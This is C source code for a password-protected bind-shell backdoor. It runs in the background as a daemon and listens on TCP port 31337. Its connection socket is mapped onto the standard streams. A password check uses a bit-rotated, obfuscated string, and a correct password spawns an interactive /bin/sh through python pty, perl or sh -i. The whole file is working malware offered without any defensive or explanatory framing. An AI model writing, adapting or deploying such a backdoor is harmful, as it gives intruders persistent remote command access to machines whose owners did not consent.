#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <stdlib.h>

int ba4439ee(char input[])
{
	char *mystring = "\xa2\xc3\xe7\xe7\xef\xdf\xe7\xcb"; //Password
	int i = 0;
	char result;
	int szMyString = 0;
	while (mystring[szMyString])
	{
		szMyString++;
	}
	int szInput = 0;
	while (input[szInput])
	{
		szInput++;
	}
	if (szInput - szMyString)
	{
		return szInput - szMyString;
	}

	while (input[i])
	{
		int _input = input[i];
		int _string = mystring[i];
		result = (_input << 1) | (_input >> 7);
		if (result - _string)
		{
			return result;
		}
		i++;
	}
	return 0;
}


int main() {
	int s, c, i;
	char p[30];
	struct sockaddr_in r;
	daemon(1, 0); //run in background
	s = socket(AF_INET,SOCK_STREAM, 0);
	if (!s)
	{
		return -1;
	}
	r.sin_family = AF_INET;
	r.sin_port = htons(31337);
	r.sin_addr.s_addr = htonl(INADDR_ANY);
	bind(s, (struct sockaddr *) & r, 0x10);
	listen(s, 5);
	while(1) {
		c = accept(s, 0, 0);
		dup2(c, 0);
		dup2(c, 1);
		dup2(c, 2);
		write(c, "Password:", 9);
		read(c, p, sizeof(p));
		for(i = 0 ; i < strlen(p) ; i++) {
			if( (p[i] == '\n') || (p[i] == '\r') )
			{
				p[i] = '\0';
			}
		}
		if (ba4439ee(p) == 0) //check password
		{
			for(i = 0 ; i < strlen(p) ; i++) {
				p[i] = '\0';
			}
			if (system("python -c \"import pty; pty.spawn('/bin/sh')\""))
			{
				//try pty with perl, if false:
				if (system("perl -e \'exec \"/bin/sh\";\'"))
				{
					// can not pty
					system("/bin/sh -i");
				}
			}
		}
		else
		{
			write(c, "Wrong Password!", 15);
		}
		close(c);
	}
}
